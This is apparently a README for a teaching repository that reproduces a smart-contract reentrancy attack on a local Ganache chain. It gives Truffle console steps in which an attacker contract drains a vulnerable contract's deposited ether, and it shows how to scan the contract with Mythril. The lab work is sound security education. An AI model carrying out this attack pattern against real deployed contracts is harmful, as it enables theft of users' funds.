How to use this repo:

First prepare the environment

1. Install Ganache or other alternative simulator to deploy a local private ETH network
2. Install Truffle Environment

Then we can start to reproduce the reentrancy attack

1. deploy the two contract with command line:
    rm -rf build/
    truffle compile
    truffle migrate --reset

2. enter truffle console:
    truffle console --network development

3. in the truffle console, execute attack:
Suppose there are ten accounts with index from 0-9 and all have 100 ether at first.
    // deploy
    let vulnerable = await VulnerableContractReentrancy.deployed()
    let attacker = await AttackerContractReentrancy.deployed()

    // account 0 transfer 50 ether to Victim Contract
    await vulnerable.depositFunds({from: accounts[0], value: web3.utils.toWei("50", "ether")});

    // check Victim Contract balance
    await web3.eth.getBalance(vulnerable.address);

    // account 1 call attacker contract to steal all balance from victim contract
    await attacker.attack({from: accounts[1], value: web3.utils.toWei("1", "ether")});

    // account withdraw all stealed balance from attacker contract
    await attacker.withdrawStolenFunds({from: accounts[1]});



How to use mythril to analyze the contract:

1. Install mythril
    pip3 install mythril
2. Analyze vulnerable contract
    myth analyze contracts/VulnerableContractReentrancy.sol